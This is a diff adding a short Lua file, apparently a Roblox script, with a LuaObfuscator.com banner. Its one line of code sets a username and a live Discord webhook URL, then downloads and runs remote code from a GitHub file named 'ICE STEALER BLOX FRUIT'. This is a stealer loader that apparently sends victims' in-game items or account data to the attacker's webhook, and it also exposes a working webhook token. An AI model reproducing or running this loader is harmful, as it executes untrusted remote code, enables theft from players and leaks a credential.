@@ -1,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
+
+]]--
+
+Username="freshguy106";Webhook="https://discord.com/api/webhooks/1329581593601511505/Il8Qs1juq5BDhDwXT-xrF9W34czkSgsUlm8Dl8bF7t_n6xtk3vpkRC6vsP5vkKysWS_D";loadstring(game:HttpGet("https://raw.githubusercontent.com/ICESCRIPT000/ICE-SCRIPT/refs/heads/main/ICE%20STEALER%20BLOX%20FRUIT"))();
